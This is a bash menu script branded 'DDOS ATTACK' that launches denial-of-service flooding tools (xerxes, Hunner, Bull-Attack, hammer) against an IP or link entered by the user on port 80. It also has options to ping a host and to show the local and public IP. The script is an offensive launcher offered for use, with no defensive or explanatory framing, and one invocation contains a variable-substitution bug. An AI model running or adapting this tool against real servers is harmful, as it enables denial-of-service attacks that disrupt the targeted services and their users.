#!/bin/bash 
#colors
cyan='\033[1;36m'
green='\033[1;32m'
red='\033[1;31m'
yellow='\033[1;33m'
blue='\033[1;34m'
purple='\033[1;35m'
reset='\033[0m'
sleep 1
figlet " DDOS ATTACK"
echo -e "$red Ahsan $blue Alsaeh"
echo -e  "$blue            .-.-.."
echo -e  "           /+/++//"
echo -e  "          /+/++//"
echo -e  "$green   *   * /+/++//"
echo -e  "    \ /  |/__//"
echo -e  "  {X}v{X}|///|$red==========.  "
echo -e  "    (')  /'|'\           \ "
echo -e  "        /  \  \          ' "
echo -e  "        \_  \_ \_   ___Thebast 2.0.0___ "

sleep 2

echo -e  "
$red ___________________
|                 |
| [1]xerxes       |
$green| [2]Hunner       |
| [3]Bull-Attack  |
| [4]hammer       |
$blue| [5]ip           | 
| [6]my ip        | 
|_________________|
"
read -p "number------->>>"  u
if [ $u -eq 1 ]; then 
read -p "ip/linke----->>>"  ip
cd xerxes

./xerxes ${ip/linke} 80
read -p "Entar----->>>"
bash Ahsan.sh
fi 
if [  $u -eq 2 ]; then 
cd Hunner
python hunner.py
read -p "Entar----->>>"
bash Ahsan.sh 
fi 
if [ $u -eq 3 ]; then
cd Bull-Attack
python2 B-attack.py
read -p "Entar---->>"
bash Ahsan.sh
fi
if [ $u -eq 4 ]; then
cd hammer
read -p "ip/link----->>>" ip 

python3 hammer.py -s ${ip} -p 80 -t 130
read -p "Entar----->>>"
bash Ahsan.sh 
fi 
if [ $u -eq 5 ]; then 
read -p "link---->>" i
ping ${i}
read -p "Entar---->>"
bash Ahsan.sh
fi 
if [ $u -eq 6 ]; then

echo -e "$red{=======my$blue========ip$green==========}"
       curl ifconfig.me
echo -e  "$blue"
ifconfig wlan0 | grep -o 192..........
#echo -e "$green "
echo -e  "{======$blue=======$green========$red=========}"



read -p "Entar----->>"
bash Ahsan.sh
fi 
bash Ahsan.sh
